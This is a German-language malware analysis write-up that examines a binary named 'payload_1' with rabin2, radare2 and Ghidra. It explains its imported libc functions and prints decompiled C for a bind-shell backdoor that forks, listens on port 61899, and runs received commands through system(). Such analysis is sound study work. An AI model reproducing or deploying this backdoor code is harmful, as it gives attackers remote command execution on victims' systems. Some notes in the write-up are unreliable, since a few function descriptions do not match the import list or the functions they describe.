# Imports der payload Datei mit rabin2 untersuchen

payload: ein "payload" bezieht sich auf eine Komponente von Schadsoftware (Malware), die dazu bestimmt ist, eine bestimmte Reihe von bösartigen Aktionen auf dem Computer oder im Netzwerk eines Opfers auszuführen. Ein payload ist in der Regel der Teil der Malware, der für die Ausführung des eigentlichen Angriffs oder Schadens verantwortlich ist

1. Imports ausgeben lassen

*Im Terminal eingeben:*

rabin2 -i payload_1

oder 

r2 payload_1 

aa 

afl

#### Konsole 
````$ rabin2 -i payload_1

nth vaddr      bind   type   Bib name
―――――――――――――――――――――――――――――――――――――
1   0x00000000 WEAK   NOTYPE     _ITM_deregisterTMCloneTable
2   0x00001120 GLOBAL FUNC       setsockopt
3   0x00001130 GLOBAL FUNC       __stack_chk_fail
4   0x00001140 GLOBAL FUNC       system
5   0x00001150 GLOBAL FUNC       htons
6   0x00001160 GLOBAL FUNC       printf
7   0x00001170 GLOBAL FUNC       memset
8   0x00001180 GLOBAL FUNC       read
9   0x00000000 GLOBAL FUNC       __libc_start_main
10  0x00000000 WEAK   NOTYPE     __gmon_start__
11  0x00001190 GLOBAL FUNC       listen
12  0x000011a0 GLOBAL FUNC       bind
13  0x000011b0 GLOBAL FUNC       perror
14  0x000011c0 GLOBAL FUNC       accept
15  0x000011d0 GLOBAL FUNC       exit
16  0x00000000 WEAK   NOTYPE     _ITM_registerTMCloneTable
17  0x000011e0 GLOBAL FUNC       fork
18  0x000011f0 GLOBAL FUNC       socket
19  0x00000000 WEAK   FUNC       __cxa_finalize
````
 #### Imports, 
 ````das Programm wurde  nicht statisch gelinkt, sodass wir die Funktionen aus der C-Library sehen können , die aufgerufen werden. 

  * `socket` - erzeugt einen Endpunkt für eine Netzwerkkommunikation
  * `setsockopt` - setzt Optionen für das Socket
  * `bind` - bindet das Socket an einen bestimmten Port
  * `listen` - wartet auf _eingehende_ Netzwerkverbindungen`bzw Port
  * `accept` - nimmt eingehende Netzwerkverbindung an
  * `read` - liest Daten ein, auch von einem Socket
  * `system` - führt ein Kommando auf dem Betriebssystem aus
  * `htons` - wandelt Daten in die sogenannte Network-Byte-Order
  * `fork` - erzeugt einen neuen Kindprozess 
  ````
2. Funktionen untersuchen

* Möglichkeit 1: mit radare2: z.B. durch pdf @ *funktionsname*
* Möglichkeit 2: payload Datei in Ghidra öffnen und unter imports Funktionen anzeigen lassen und untersuchen/ decompilieren

    2.1 setsocketopt: 

        ◦ `int setsockopt (int __fd, int __level, int __optname, void * __optval, socklen_t __optlen)` 
        ◦ Konfiguration von Netzwerk-Sockets 
        ◦ Malware:
            ▪ Netzwerk-Sockets für Kommunikation mit 
            Command and Control-Server konfigurieren 
            → Daten exfiltrieren, remote control
            ▪ Network tunneling
            ▪ Proxying
    2.2 write
    
        ◦ `ssize_t write (int __fd, void * __buf,
         size_t __n)`
        ◦ ssize_t: signed integer type
        ◦ genutzt um in Datei zu schreiben
        ◦ Malware:
            ▪ Daten exfiltrieren: Daten aus System an 
            remote Server senden
            ▪ Dateien überschreiben
            ▪ Konfigurationsdateien / startup skript 
            erstellen
    2.3 __stack_chk_fail

        ◦ `undefined __stack_chk_fail (void)`
        ◦ Teil einer Sicherheitsfunktion, die als 
        "Stack Smashing Protection" (SSP) oder "Stack 
        Canaries" bekannt ist, die in einigen C/C++ 
        Compilern, einschließlich GCC (GNU Compiler 
        Collection)
        ◦ Der Zweck dieses Mechanismus ist es, 
        Programme vor der Ausnutzung von 
        Pufferüberlaufschwachstellen zu schützen, die 
        häufig von Angreifern ausgenutzt werden, um 
        beliebigen Code auszuführen oder die 
        Kontrolle über ein Programm zu erlangen. Der 
        Canary fungiert als Sentinel-Wert, um zu 
        erkennen, ob ein Stack-basierter Pufferüberlauf aufgetreten ist, und bietet 
        eine zusätzliche Sicherheitsebene. Bei der 
        normalen Programmausführung werden Sie 
        normalerweise nicht mit __stack_chk_fail 
        interagieren oder es direkt aufrufen. Es wird 
        automatisch durch den vom Compiler erzeugten 
        Code aufgerufen, wenn ein Stapelüberlauf 
        festgestellt wird. 
        ◦ Malware:
            ▪ exploit stack canaries: Denial of 
            Service (DoS)
            ▪ Stack Canary Bypass
    2.4 system
    
        ◦ `int system (char * __command)`
        ◦ Standardfunktion der C-Bibliothek, die zur 
        Ausführung von Shell-Befehlen aus einem C- 
        oder C++-Programm heraus verwendet wird
        ◦ die system Funktion gibt den command an das 
        terminal weiter wo es ausgeführt wird
        ◦ der return wert gibt auskunft über erfolg 
        (0) oder misserfolg (-1)
        ◦ Malware:
            ▪ command injection attacks
            ▪ aufpassen bei shell commands mit user 
            input
    2.5 htons

        ◦ host to network short
        ◦ `uint16_t htons (uint16_t __hostshort)`
        ◦ teil der C Standard library: 
        16-Bit-Ganzzahl von der Host-Byte-Reihenfolge 
        in die Netzwerk-Byte-Reihenfolge umwandeln 
        (big/little endian)
        ◦ Malware:
            ▪ kann zum Formatieren von Daten und 
            Nachrichten für das Senden und Empfangen 
            von Befehlen oder Daten von einem remote 
            Server verwendet werden.
    2.6 dup

        ◦ `int dup (int __fd)`
        ◦ Funktion aus der standard C library mit der 
        man file descriptors duplizieren kann → 
        erstellt neuen file descriptor der auf das 
        gleiche file, socket, I/O resource 
        referenziert
        ◦ Malware: 
            ▪ Manipulation von file descriptors, 
            Datenklau, redirection I/O operationen
    2.7 memset
    
        ◦ `void * memset (void * __s, int __c, size_t __n)`
        ◦ wird genutzt um einen Speicherbereich mit 
        einem bestimmten byte Wert zu belegen
        ◦ s: Pointer auf die Startadresse
        ◦ c: Byte-Wert der gesetzt werden soll
        ◦ n: Anzahl an Bytes die man setzen möchte
        ◦ Malware:
            ▪ Speicher überschreiben 
    2.8 close

        ◦ `int close (int __fd)`
        ◦ fd: file descriptor den man schließen möchte
        ◦ richtet die Register und den Stack ein und 
        ruft dann die __libc_start_main Funktion auf
        ◦ bereitet die Umgebung vor bevor das 
        Hauptprogramm gestartet wird
        ◦ Malware:
            ▪ Malware kann die close Funktion 
            verwenden, um ihre Spuren zu verwischen, 
            indem sie file descriptors schließt, die 
            auf log Dateien oder kritische 
            Systemressourcen verweisen
    2.9 read

        ◦ `ssize_t read (int __fd, void * __buf, size_t __nbytes)`
        ◦ um Daten aus file descriptor zu lesen und 
        in einen Buffer zu schreiben
        ◦ fd: file descriptor
        ◦ buf: pointer auf den Buffer wo die Daten 
        gespeichert werden
        ◦ nbytes: Anzahl an Bytes die man aus dem 
        file descriptor lesen möchte
        ◦ Malware:
            ▪ sensitive Daten lesen
    2.10 __libc_start_main

        ◦ `undefined __libc_start_main (void)`
        ◦ ruft die main Methode auf
    2.11 __gmon_start__

        ◦ `undefined __gmon_start__ (void)`
        ◦ wird von der GNU Compiler Collection (GCC) 
        generiert
        ◦ gibt Infos über die Ausführung eines 
        Programms und dessen Performance
    2.12 listen

        ◦ `int listen (int __fd, int __n)`
        ◦ wird in der Netzwerk-Programmierung 
        eingesetzt und bspw ein Socket zu 
        implementieren welches Daten von einem Client 
        liest
        ◦ sfd: socket file descriptor (socket, 
        welches man als „hörendes“ Socket festlegen 
        will)
        ◦ backlog: max Anzahl an Verbindungen die die 
        Socket queuen kann (max Anzahl an Clients)
        ◦ Malware:
            ▪ implementierung des listening Socket 
            des Malware-Servers
            ▪ Datendiebstahl
            ▪ Proxy Server
    2.13 bind

        ◦ `int bind (int __fd, sockaddr * __addr, 
        socklen_t __len)`
        ◦ wird genutzt um Socket an lokale Adresse 
        (IP oder Port) zu binden
        ◦ Malware:
            ▪ Server aufsetzen
    2.14 perror 

        ◦ `void perror (char * __s)`
        ◦ um Error Messages auszugeben
    2.15 accept

        ◦ `int accept (int __fd, sockaddr * __addr, 
        socklen_t * __addr_len)`
        ◦ akzeptiert eingehende Verbindungen bei 
        einem listening Socket → handelt eingehende 
        Client-Verbindungen
    2.16 exit

        ◦ `void exit (int __status)`
        ◦ Funktion um Programm zu beenden
        ◦ Malware:
            ▪ zum Beispiel um Spuren zu verwischen 
            nachdem der payload gestartet wurde
    2.17 _ITM_registerTMCloneTable

        ◦ `undefined _ITM_registerTMCloneTable (void)`
        ◦ Die Funktion _ITM_registerTMCloneTable ist 
        Teil der GNU C Library (glibc) und steht im 
        Zusammenhang mit der Unterstützung von 
        Transaktionsspeicher im Kontext der 
        nebenläufigen Programmierung. 
        Transaktionsspeicher ist ein 
        Programmierparadigma, das eine Möglichkeit 
        bietet, nebenläufige Programme mit der 
        Einfachheit der sequentiellen Programmierung 
        zu schreiben und gleichzeitig die 
        Synchronisierung von Threads zu verwalten und 
        die Datenkonsistenz zu gewährleisten.
    2.18 __cxa_finalize

        ◦ `undefined __cxa_finalize (void)`
        ◦ ist eine Art Garbage Collector
        ◦ wird von der C++ runtime environment 
        durchgeführt
    2.19 fork

        ◦ `__pid_t fork (void)`
        ◦ Erzeugung von Prozessen in Unix-like 
        Betriebssystemen (zB Linux) → erstellt eine 
        Kopie von dem aktuellen Prozess (mit der 
        process id (pid))
        ◦ Malware:
            ▪ Multiplizierung von Prozessen: 
            erstellung von child processes die 
            unterschiedliche schädliche Aktivitäten 
            ausführen
            ▪ Distributed Denial of Service (DDoS)
    2.20 socket

        ◦ `int socket (int __domain, int __type, int __protocol)`
        ◦ neue Sockets erstellen
        ◦ domain: Kommunikations domain oder adress 
        familie (zB AF_INET für IPv4 bzw AF_INET6 für 
        IPv6)
        ◦ type: TCP (SOCK_STREAM) / UDP (SOCK_DGRAM)

## Exports

**main:**
```
void main(void)

{
  __pid_t _Var1;
  
  _Var1 = fork();   /* child prozess erstellen ueber den der server gestartet wird. Sorgt dafuer, dass der server im Hintergrund laeuft */
  if (_Var1 == 0) {
    server();
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

**server:**

```
void server(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined4 local_440;
  socklen_t local_43c;
  int local_438;
  int local_434;
  size_t local_430;
  sockaddr local_428;
  char local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_440 = 1;
  local_43c = 0x10;
  memset(&local_428,0,0x10);
  local_438 = socket(2,1,0);
  
  	/* Socket Initialisierung für Kommunikation über 
    IPv4 (2) und TCP (1) */

  if (local_438 == 0) {
    perror("socket failed");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = setsockopt(local_438,1,0xf,&local_440,4);
  
  	/* reuseAdresse wird auf 1 gesetzt (local_440) um 
    die socket Adresse wiederzuverwenden → Server 
    neustart auf gleichem Port wenn er 
    heruntergefahren wurde */

  if (iVar1 != 0) {
    perror("setsockopt failed");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_428.sa_family = 2;
  local_428.sa_data[2] = '\0';
  local_428.sa_data[3] = '\0';
  local_428.sa_data[4] = '\0';
  local_428.sa_data[5] = '\0';
  local_428.sa_data._0_2_ = htons(0xf14b);
  iVar1 = bind(local_438,&local_428,0x10);
  
  		/* Socket wird mit Adresse local_428 
        verknüpft. Die Adresse enthält eine IPv4 
        Adresse und eine Port Nummer (0xf14b bzw 
        61899) */

  if (iVar1 < 0) {
    perror("bind failed");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = listen(local_438,3);
  
  		/* Socket(local_438) kann bis zu 3 
        Verbindungen gleichzeitig aufbauen */ 

  if (iVar1 < 0) {
    perror("listen failed");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  memset(local_418,0,0x400);
  while( true ) {
    local_434 = accept(local_438,&local_428,&local_43c);

    		/*Endlosschleife in der eingehende 
            Verbindungen akzeptiert werden. Für jede 
            Verbindung wird ein neues Socket
            (local_434) für die Kommunikation mit dem 
            Client erstellt */

    if (local_434 < 0) break;	
    
    /* wenn client disconnected (accept liefert wert 
    < 0) wird cleanup gestartet und auf neue 
    Verbindungen gewartet */

    close(0);		

    /* die standard input, output und error streams 
    (file descriptors 1,2,3) werden geschlossen und 
    an das Socket mit dup umgeleitet */

    close(1);
    close(2);
    dup(local_434);	
    dup(local_434);
    dup(local_434);
    while( true ) {
      local_430 = read(local_434,local_418,0x400);

      	/*in der inneren Schleife werden die Daten 
        vom Client Socket in local_418 gelesen und in 
        den Buffer local_418 geschrieben. 
        Anschließend werden die empfangenen Daten mit 
        der Funktion system als Command ausgeführt 
        und der output des commands zurück an den 
        Client geschrieben mit write */

      if (local_430 == 0xffffffffffffffff) break;
      write(0,"\nYes, master... executing: ",0x1b);
      write(0,local_418,local_430);
      write(0,&DAT_00100e4a,1);
      system(local_418);
      memset(local_418,0,0x400);
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```


# Schlussfolgerung

Es handelt sich vermutlich um einen command and control (C2) server(Netzwerkserver,) der auf einen spezifischen Port hört (durch "bind" und "listen"), Daten empfängt (mit "read") und diese Daten möglicherweise verwendet, um Befehle direkt im Betriebssystem mithilfe von "system" auszuführen. Die Verwendung von "fork" deutet darauf hin, dass das Programm einen zusätzlichen Prozess erstellt, möglicherweise, um im Hintergrund zu laufen und unbemerkt zu bleiben.

